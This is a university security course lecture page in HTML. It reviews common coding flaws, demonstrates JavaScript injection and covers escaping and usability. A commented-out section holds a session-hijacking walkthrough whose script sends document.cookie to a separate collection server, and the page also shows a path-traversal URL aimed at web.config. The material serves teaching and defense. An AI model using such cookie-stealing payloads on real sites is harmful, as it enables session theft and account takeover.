<html>
	<head>
		<title>Lecture 17 Review of course</title>
		<style>
			.red { color : red }
		</style>
	</head>
	<body>
		<h4>Lecture 17 Review of course</h4>
<pre>

Areas covered:
0. Confidentiality, integrity and availability
1. Security policies
2. Using cryptography for confidentiality and integrity
3. Authentication (passwords)
4. Identity
5. Malicious logic
6. Penetration testing (finding vulnerabilities)
7. Intrustion detection
8. Sample network.

Principles of computer security
LP  least privilege
FSD fail-safe defaults
SP  separation of privilege
EM  economy of mechanism
CM  complete mediation
OD  open design
SP  separation of privilege
LCM least common mechanism
PA  psychological acceptibility

<h3>19 deadly sins</h3>
<h4>Evil user input</h4>
<li>Use of "magic" URLs and hidden form fields <a target='magic' href='Lecture11.htm#19sins'>Lecture 11</a>
  Three ways to have browser save state
    1. cookies (Set-Cookie: sessionID=123; path=/...)
    2. URL rewriting (&lt;a href='www.blah.com?sessionID=123'>blah link&lt;/a>)
    3. hidden fields (&lt;asp:HiddenField ID='sessionID' Value='123'>)
  All of these can be modified on the client. Cookies are the most
  convenient for the server, just have to be sent once. 
</li>
<li>SQL injection <a target='sql' href='Lecture05.htm#19sinsSQL'>Lecture 5</a>
  Use Stored procedures (carefully), SqlParameter or Linq!!
</li>
<li>Command injection <a target='command' href='Lecture12.htm#19sins'>Lecture 12</a>
  Similar to SQL injection except commands are sent to OS rather than 
    DBMS.
  Managed environment: using reflection on user input is not advised (but
  configuration files do this all the time):
    using System.Reflection;
    string userInput = "Evil" ; // class Evil implements interface X
    Class c = Class.forName(userInput);
	  X obj = (X)c.newInstance();
</li>
<li>Buffer Overflows <a target='buffer' href='Lecture13.htm#19sinsOverflow'>Lecture 13</a>
  Greatly reduced by managed environment
  Maxim's DP API (\\10.10.10.124\Demos\DPAPIMaxim) uses DllImport to 
    directly make Win32 system calls which are not managed!
</li>
<li>Format String problems <a target='format' href='Lecture14.htm#19sinsFormat'>Lecture 14</a>
  Similar to SQL injection except user input is processed by printf
  or System.Format.
  string userInput = "{0}";
  String.Format(userInput);  // throws FormatException
</li>
<li>Integer range errors <a target='integer' href='Lecture14.htm#19sinsInteger'>Lecture 14</a>
  Can be used to cause buffer overflows in non-managed environments.
  Example:
    First note the following:
    66,000 = 10000000111010000
    464=             111010000
   
    66,000 is 17 bits long which means that when it is assigned to a 
    short which is 16 bits, the high order bit is truncated and it 
    becomes 464.

    Now here is the program:

    StringBuilder sb = new StringBuilder();
    for (int i=0; i&lt;66000; i++)
    {
      sb.append(' ');
    }
  	
    String evilUserInput = sb.toString();  // 66,000 characters long
  	
    short len = (short)evilUserInput.length();  // len is 464!! (see above)
    char a[]= new char[len];  // allocate 464 characters not 66,000!
  	
    for (int i=0; i&lt;evilUserInput.length(); i++)  // Note: evilUserInput.length() is 66,000!
    {
      a[i] = evilUserInput.charAt(i);  // ArrayIndexOutOfBoundsException thrown when i == 464
                                       // but buffer overflow in C
    }
</li>  
<li>Improper file access <a target='file' href='Lecture16.htm#19sins'>Lecture 16</a>
  a. https://www.mumde.net/cs000/DecoratePage.aspx?file=<span class='red'>web.config</span>
  is an example of magic URL
  https://www.mumde.net/cs000/DecoratePage.aspx?file=<span class='red'>https://www.mumde.net/cs000/DecoratePage.aspx?file=../../CS545Winter/web.config</span>  
  
  b. is an example of improper file access (trying to navigate to another
  virtual directory.) In .NET Request.MapPath can be told to throw an
  exception if a user does this (third parameter is 
  "allowCrossSiteMapping"; if set to false will throw exception)
</li>  
<li>Cross-site scripting <a target='xss' href='Lecture17.htm#19sinsCross'>Lecture 17</a>
  Scourge of Web 2.0. Your browser displays HTML generated by strangers
    that contains Javascript which is executed on your machine.
</li>
<h4>Basic developer carelessness</h4>
<li>Failing to protect network traffic <a target='snoop' href='Lecture09.htm#19sinsSniffer'>Lecture 9</a>
  if (!Request.Url.IsLoopback && !Request.IsSecureConnection)
  {
    string url = Request.Url.AbsoluteUri;
    Response.Redirect(url.Replace("http", "https"));
  }
</li>
<li>Information leakage <a target='leak' href='Lecture05.htm#19sinsLeakage'>Lecture 5</a>
    In web.config:
    &lt;customErrors mode="RemoteOnly"  defaultRedirect="GenericError.aspx"/>
    can also be "Off" which will always displayed a stack trace or
    "On" which will always display a custom error, even on the developer's
    machine
</li>
<li>Failing to store and protect data securely <a target='protect' href='Lecture01.htm#19sins'>Lecture 1</a></li> 
   Be careful what you send to browser. Here is how google uses MD5
   to detect correct answer on browser:
   From http://gwigle.varten.net/
   // This Javascript function was dynamically generated on the server
   function checkAnswer(v)
   {
     if(v.length==6)   // the answer is 6 characters long
     {
	     var h = md5(v.toLowerCase()); // compute MD5 of user's answer
	     if(h.substr(0,8)=='c822c1b6') // 'c822c1b6' is 1st 8 bytes of MD5 on server
	     {
		     alert('Correct');
		     // set location bar on browser
		     $('nextlevel').innerHTML = 
		       '<a href="level-1.1-'+h.substr(8, 8)+'.html">Proceed to level 1.1</a>';
	   }
	   else
	   {
		   alert('Incorrect');
	   }
   }
 
<li>Failing to use cryptographically strong random numbers <a target='strong' href='Lecture08.htm#19sins'>Lecture 8</a>
  Attacker should not be able to guess a number generated by the server.	    
</li>

<li>Use of weak password-based systems <a target='weak' href='Lecture10.htm#19sins'>Lecture 10</a>
  Make user chose good password.
  Store hash of password.
</li>
<li>Failure to handle errors <a target='failerrors' href='Lecture13.htm#19sinsErrors'>Lecture 13</a>
  Avoid empty catch clause!
</li>
<li>Poor usability <a target='usability' href='Lecture17.htm#19sinsUsability'>Lecture 17</a>
  See below.
</li>
  
<h4>Advanced developer carelessness</h4>
<li>Trusting network address information <a target='snoop' href='Lecture15.htm#19sins'>Lecture 15</a>
  Two ways to fool a user. Let's say that Trudy's machine has IP address
  176.32.12.213 and domain name www.mum_de.net

  a. Phishing
   Trudy could send you an email supposedly from me which asked you to
   click the link www.mum_de.net/cs000/ (not www.mumde.net/cs000/) and
   log onto the system to see an important change in the current lab. Normal
   DNS processing would convert www.mum_de.net to 176.32.12.213 and you 
   would see Trudy's version of the course logon page which would record
   your password.

  b. DNS cache poisoning (http://en.wikipedia.org/wiki/DNS_cache_poisoning)
   Trudy could poison the cache of your DNS server (which the browser
   contacts to translate domain names into an IP address) to return 
   176.32.12.213 for domain name www.mumde.net, instead of 64.209.134.189.
   Run nslookup www.mumde.net in a DOS box.

  Phishing works because user is careless. User is powerless against
  DNS cache poisoning. This is a Namita-scale problem.
</li>
<li>Race conditions (improper thread programming) <a target='race' href='Lecture07.htm#19sins'>Lecture 7</a>
  Beware of static variables and Application scope (state shared by
  all users).
</li>
<li>Unauthenticated key exchange <a target='unauth' href='Lecture09.htm#19sinsUnauthenticated'>Lecture 9</a>
	Don't write your own cryptographic protocols!
</li>
  
<li>Improper use of SSL <a target='ssl' href='Lecture09.htm#19sinsSSL'>Lecture 9</a>
	Make sure certificates are okay!
</li>

		
<h4>19 Deadly Sins of Software Security</h4>
In early 2004, Amit Yoran, then the director of the National Cyber Security Division at the
U.S. Department of Homeland Security, announced that about 95 percent of software security bugs
came from 19 "common, well-understood" programming mistakes. 

The book <a href='http://www.amazon.com/Deadly-Sins-Software-Security-One-off/dp/0072260858'>19 Deadly Sins of Software Security</a> by Howard, LeBlanc and Viega
documents these 19 programming flaws. They are:
<ol>
<li>Failing to store and protect data securely <a href='Lecture01.htm#19sins'>Lecture 1</a></li> 
<li>Information leakage <a href='Lecture05.htm#19sinsLeakage'>Lecture 5</a></li>
<li>SQL injection <a href='Lecture05.htm#19sinsSQL'>Lecture 5</a></li>
<li>Race conditions (improper thread programming) <a href='Lecture07.htm#19sins'>Lecture 7</a></li>
<li>Failing to use cryptographically strong random numbers <a href='Lecture08.htm#19sins'>Lecture 8</a></li>
<li>Failing to protect network traffic <a href='Lecture09.htm#19sinsSniffer'>Lecture 9</a></li> 	
<li>Unauthenticated key exchange <a href='Lecture09.htm#19sinsUnauthenticated'>Lecture 9</a></li> 
<li>Improper use of SSL <a href='Lecture09.htm#19sinsSSL'>Lecture 9</a></li>
<li>Use of weak password-based systems <a href='Lecture10.htm#19sins'>Lecture 10</a></li>
<li>Use of "magic" URLs and hidden form fields <a href='Lecture11.htm#19sins'>Lecture 11</a></li>
<li>Command injection <a href='Lecture12.htm#19sins'>Lecture 12</a></li>
<li>Buffer Overflows <a href='Lecture13.htm#19sinsOverflow'>Lecture 13</a></li>
<li>Failure to handle errors <a href='Lecture13.htm#19sinsErrors'>Lecture 13</a></li>
<li>Format String problems <a href='Lecture14.htm#19sinsFormat'>Lecture 14</a></li>
<li>Integer range errors <a href='Lecture14.htm#19sinsInteger'>Lecture 14</a></li>
<li>Trusting network address information <a href='Lecture15.htm#19sins'>Lecture 15</a></li>		
<li>Improper file access <a href='Lecture16.htm#19sins'>Lecture 16</a></li>
<li><span class='red'>Cross-site scripting</span> <a href='Lecture17.htm#19sinsCross'>Lecture 17</a></li>
<li><span class='red'>Poor usability</span><a href='Lecture17.htm#19sinsUsability'>Lecture 17</a></li>
</ol>

All of these could happen in a managed environment, although a buffer overflow would have
to happen inside the virtual machine (JVM or CLR).

<a id='19sinsCross'/>
<h4>Introduction to javascript injection</h4>	
This week we will look at <span class='red'>cross-site scripting</span>. To 
understand cross-site scripting, it is necessary to understand HTML and 
Javascript. We will not have time to learn these areas in this class 
but I hope to give you enough knowledge of them to understand an 
example of a cross-site scripting attack. In this lecture I describe a 
simple Javascript injection. In the next lecture I will describe how 
to exploit Javascript injection to pull off cross-site scripting.

There are plenty of tutorials on HTML and Javascript on the web. For 
example <a target='w3c' href='http://w3schools.com'>w3schools.com</a>

I have written a simple web page <a target='t5' href='http://www.mumde.net/lab07DE/'>http://www.mumde.net/lab07DE/</a>.

All this web page does is copy whatever you type in the textbox 
to the end of the page when you click the Submit button.

Open this page in a browser, right click the page and choose 
<b>View Source</b> if you are using IE and <b>View Page Source</b> if 
you are using Firefox. You will see something that looks like 
this: (I have editted the source slightly.)

&lt;html xmlns="http://www.w3.org/1999/xhtml" >
&lt;head>
  &lt;title>Lab07DE&lt;/title>
&lt;/head>
&lt;body>
    &lt;<span class='red'>form</span> name="form1" method="post" action="Default.aspx" id="form1">
      &lt;h4>Enter something:&lt;/h4>
      &lt;<span class='red'>textarea</span> name="txtReview" rows="5" cols="80" id="txtReview">&lt;/textarea>&lt;br />
      &lt;<span class='red'>input</span> type="submit" name="btnSubmit" value="Submit" id="btnSubmit" />&lt;br />
      &lt;p>&lt;/p>        
    &lt;/form>
&lt;/body>
&lt;/html>

The <span class='red'>textarea</span> control is where the user types some text. 
The <span class='red'>input</span> control causes the text entered in 
the textarea to be sent to the URL specified in the action attribute of 
the <span class='red'>form</span> tag.

The http://www.mumde.net/Lab07DE/Default.aspx/ web application merely 
takes whatever is typed into the text area and adds it to the end of 
the page as a paragraph, so if you were to type "hello world" in the 
text area, click Submit, and view the source of the page that is 
returned you would see

&lt;html xmlns="http://www.w3.org/1999/xhtml" >
&lt;head>
  &lt;title>Lab07DE&lt;/title>
&lt;/head>
&lt;body>
    &lt;form name="form1" method="post" action="Default.aspx" id="form1">
      &lt;h4>Enter something:&lt;/h4>
      &lt;textarea name="txtReview" rows="5" cols="80" id="txtReview">hello world&lt;/textarea>&lt;br />
      &lt;input type="submit" name="btnSubmit" value="Submit" id="btnSubmit" />&lt;br />
      &lt;p><span class='red'>hello world</span>&lt;/p>
    &lt;/form>
&lt;/body>
&lt;/html>

I have highlighted in red the text that was added to the end of the page. 
The &lt;p> tag indicates that the text should be in a separate paragraph.

This web application essentially lets the user of the page enter some 
text and then that text is inserted at the end of the page as a 
paragraph. Many web sites do something similar to this. For example 
amazon.com lets readers type in reviews of books and then displays the
reviews upon request in a web page.

What is the harm in this? Well, similar to SQL injection in lab 1, the 
user might type something in the textarea that will cause the browser 
to behave in an insecure manner. That something is Javascript. 
Javascript is a scripting language that is interpreted by the browser. 
The &lt;script> tag tells the browser to execute whatever is inside the 
tag. Copy and save the following HTML into a file and open it with a 
browser. You will see a popup dialog that says "hello" (The browser 
may ask you if want to run scripts; if it does, allow script execution).

&lt;html>
  &lt;body>
    Name: &lt;input type='text'/>&lt;br/>
    <span class='red'>&lt;script>alert('hello');&lt;/script></span>
  &lt;/body>
&lt;/html>

You are observing the execution of the Javascript script that is marked 
in red.

Now lets return to <a target='t5' href='http://www.mumde.net/lab07DE/'>http://www.mumde.net/lab07DE/</a>.
This time enter the following in the textbox:

&lt;script>alert('hello world');&lt;/script>

When you click submit you will see a popup dialog that says 
"hello world". If you view the source of the page now you will see that 
the script has been inserted at the end of the page. This is called 
Javascript injection because Javascript has been injected into the page 
by someone other than the page author. Javascript injection is the 
basis of the cross-site scripting attack. 

<h4>Solution to javascript injection</h4>
A page can protect itself against Javascript injection by escaping 
certain special characters that are interpreted by HTML. In particular, 
any &lt; should be escaped using &amp;lt;. Doing this would convert

<b>&lt;script>alert('hello world')&lt;/script></b>

to

<b>&amp;lt;script>alert('hello world')&amp;lt;/script></b>

Trying copying and pasting the above line into <a target='t5' href='http://www.mumde.net/lab07DE/'>http://www.mumde.net/lab07DE/</a>
and see what happens.

Most class libraries have a utility class that has a method that will 
escape all dangerous HTML characters. In ASP.NET it is called 
<b>Server.HtmlEncode(...)</b>.

<!--
<h4>Using javascript injection to hijack a session</h4>
Some useful URLs
<b>http://rbunker.kattare.com/Lab06DemoDE/</b>
<b>http://www.mumde.net/DotImage/MyImage.aspx?userid=x=yourname</b>
<b>http://www.mumde.net/DotImage/Userid.aspx</b>

Now lets look at a demo I have created to show XSS in action.

I have written a simple application that is meant to remind you of an 
online bookstore's book review page where readers can enter reviews of 
a book which are visible to everybody.

Open <a target='demo' href='http://rbunker.kattare.com/Lab06DemoDE/'>http://rbunker.kattare.com/Lab06DemoDE/</a> in a browser.
Sign in using any name and click Logon. You will see a page with a 
textbox.Enter a "review" in the textbox and click Submit. You will see 
what you entered appear below. Enter something else in the textbox and 
click Submit again. You will now see both "reviews" displayed after the
textbox. Now enter <b>&lt;script>alert('hello')&lt;/script></b>. Click 
Submit and you will see a popup dialog that says "hello". This is the 
behavior that we have seen previously.

If the "reviews" were saved in a database (they are not for this simple 
application), then every user who logged on would see the hello popup 
when they viewed the reviews page. This is merely an annoyance. Another 
annoyance would be to enter <b>&lt;a href='></b> for the first entry.
All other entries will then be underlined for everybody who views the 
page.

Now let's look at a serious exploit that is more than just an annoyance. 
The login page creates cookies for the user name and a session ID. The 
session ID cookie is used to identify the current session of the user 
on the server. A server session survives as long as the browser is open 
or until a fixed amount of time has elapsed (e.g., 20 minutes). In a 
real application, the server session would contain things such as a 
shopping cart or the database ID of information about the user. If an 
attacker can get the session ID of user X then he/she can create a 
cookie that contains that session ID and have access to information 
about user X because to the web application he will appear to be user X.
This is called <b>session hijacking</b>.

In what follows I describe one way that an attacker can hijack a 
session of another user of 
http://rbunker.kattare.com/Lab06DemoDE/

To help me pull this off, I have written a simple web application on 
another server that returns one red pixel. 
Open <a target='img' href='http://www.mumde.net/DotImage/MyImage.aspx'>http://www.mumde.net/DotImage/MyImage.aspx</a> in a browser. 
Look closely and you will see a single red dot in the upper left corner 
of the page. 

Next, do the following:
1. Open <b>http://www.mumde.net/DotImage/MyImage.aspx?userid=x=yourname</b> in 
the browser.
2. Open <b>http://www.mumde.net/DotImage/Userid.aspx</b> in the browser and 
you will see near the end of the page the line, <b>x=yourname</b>.

So the http://www.mumde.net/DotImage/MyImage.aspx application not only 
returns a single red pixel but it also saves the value of the query 
parameter <b>userid</b> on the server and this is available for all to 
view. Note that a real hacker would not make it available for everybody
to view, but that wouldn't make a very good demo. 

Now we are ready to pull off the attack. Open 
http://rbunker.kattare.com/Lab06DemoDE/ in a
browser, log in and enter a remark and click submit. Then
enter the following as a remark:

<b>
&lt;img id='imgDot' src=''/>

&lt;script>
  var s=document.cookie; 
  var el = document.getElementById('imgDot');
  el.src = 'http://www.mumde.net/DotImage/MyImage.aspx?userid=' + encodeURIComponent(s);
&lt;/script>
</b>

Click submit and then look at <b>http://www.mumde.net/DotImage/Userid.aspx</b> 
and you should see your userName and JSESSIONID. If you are not the 
first student to succeed in doing this you will also see this 
information for other students in the class.

Once you have a value of JSESSIONID you can use the <a target='tamper' href='https://addons.mozilla.org/en-US/firefox/addon/966'>Tamper plugin</a> for 
Firefox to modify the JSESSIONID cookie and you will see the remarks of 
whoever's JSESSIONID you are using. If you open two browsers (not two 
tabs in the same browser) and do the Javascript injection in both, 
you will see different JSESSIONIDs for each browser and you can do this 
experiment with your two JSESSIONIDs. Doing this experiment is not 
required, but is quite convincing if you can get it to work.

<div class='red'>
<p>Please note the following.</p>
<li> I am saving the reviews in a session, not in a database. That 
means that students will only see their own reviews and experience 
their own javascript injections. Once you close the 
browser and rerun http://rbunker.kattare.com/Lab06DemoDE/ you will 
appear to lose your previous reviews. However if you use the Tamper 
plugin of Firefox to modify the current value of the 
JSESSIONID cookie, you will magically get your reviews back (providing 
that you do this within twenty minutes or so of the time that you 
closed the browser).
</li>
<li>Because reviews are saved in a session, the only JSESSIONIDs that 
will be displayed by Userid.aspx are those of students who successfully 
carried out the above Javascript injection. If the reviews had been 
saved in a database and shared by all users, then you would see 
the JSESSIONIDs of every user who viewed the page after a single user 
had done the Javascript injection.
</li>
<li>The way to avoid this problem is to escape all HTML characters 
before inserting a review in the page. Most class libraries have a 
utility class that has a method that will escape all dangerous HTML 
characters. In ASP.NET it is called <b>Server.HtmlEncode(...)</b>.</li>

<li>Another way to prevent cookie information from being passed as query 
parameters is to designated a cookie as HttpOnly. Document.cookie will 
not reveal any cookies that are HttpOnly. The disadvantage to using 
HttpOnly is that not all browsers support it yet. (I don't think it 
is part of the formal cookie specification yet). However, the latest 
versions of IE and Firefox do support it. ASP.NET sends its sessionID
cookie as HttpOnly so this attack won't work with an ASP.NET program</li>

<li>A real hacker probably wouldn't display a red dot. There are ways 
to get Javascript to call the DotImage URL without displaying anything.</li>

<li>There are going to be 46 people banging on these two applications 
and I hope all goes well. I have not spent a lot of time testing them. 
Actually if something goes wrong, it will make this exercise more 
realistic: hacker exploits often have bugs in them.</li>

<li>If the http://www.mumde.net/DotImage/Userid.aspx application 
doesn't show the latest data, try refreshing the browser (F5 key in IE, 
Ctrl+R in Firefox)</li>
</div>

<span class='red'>
	
</span>
-->

<a id='19sinsUsability'/>
<h4>Poor usability</h4>
The April 2008 edition of the Communications of the ACM had an article 
entitled
"The Psychology of Security, why do good users make bad decisions?" by 
Ryan West. Here are some points from it.

1. "There are basic principles of human behavior that govern how users 
think about security in everyday situations and shed light on why they
undermine security by accident"

2. It is not enough to have security features in a system, the users 
must use them.

3. <b>Most user do not think they are at risk</b>. For example, most 
people think they are better than average drivers. A survey indicated 
that roughly 72% of home users did not have a properly configured 
firewall and that only 1/3 had antivirus signatures updated within
the past week.

4. <b>Users aren't stupid, they're unmotivated</b>. We tend to 
multitask doing many things at the same time. We don't have time to 
read an entire security warning. This superficial involvement
with our tasks usually works.

5. <b>Safety is an abstract concept</b> The pro-security choice often 
has no visible outcome. For example, configuring a firewall usually has 
no visible effect on the day to day use of the computer.

6. <b>Feedback and learning from security-related decisions</b> There 
is no immediate reward for increasing security. It is not like 
installing a new version of a word processor that has new features that 
can be used immediately. It is also related to Maharishi's busy
business man analogy. The more you meditate, the more energy you have. 
After a while you might forget that it is TM that is giving you that 
energy and you may decide to use the energy to do more and more work 
and not leave time to meditate.

7. <b>Evaluating the security/cost tradeoff</b> Implementing security 
takes time. User may not want to spend the time especially if they 
don't feel that they are at risk. For example, restricting access to a 
public share in Windows Vista to a group of users requires about nine 
separate steps involving six different interfaces (dialog boxes).

8. <b>Security as a secondary task</b> In cases where users are 
prompted to install software updates (which often are issued to fix 
security vulnerabilities) users are less likely to comply when in the 
middle of another task, especially if they are in a hurry.

9. <b>Reward pro-security behavior</b> Lower insurance rates if 
employees strictly follow the company's security policy.?

10. <b>Improve the awareness of the risk</b>Make security messages 
dramatic. Compare the noticability of the error message in this 
(the security warning is the last dialog box).
<img src='Images/psych1.jpg'>

as opposed to this (I don't have to tell you which dialog is the 
security warning do I?

<img src='Images/psych2.jpg'>

<b>Catch corporate security policy violators</b> Audit to detect sloppy 
security habits and send violators automatic email reminders about 
security. Too many warnings will not look good at the next performance 
review.

<b>Reduce the cost of implementing security</b> Use secure default 
settings but be aware of the principle of psychological acceptibility. 
If a default security setting (e.g. hard to guess passwords) is 
difficult to use, the users will find ways to circumvent it, e.g., 
write the password down.

<b>Some recommendations from "19 Deadly Sins of Software Security"</b>

1. The security error message should be simple and administrators 
should be able to get more information if they want to (as long as 
extra information will not help an attacker)

2. Make security prompts actionable, i.e., tell the users what they 
should do. If there is nothing specific to tell them, then perhaps just 
display an error. For example, if the name of the web site entered by 
the user doesn't match the name in the certificate, just
display an error, don't ask the user if they want to continue.

3. Make users do a little work to get at options that may be dangerous

4. Allow security policy to be relaxed selectively but be explicit and 
clear about what the consequences of what the user chooses.


</pre>
	</body>
</html>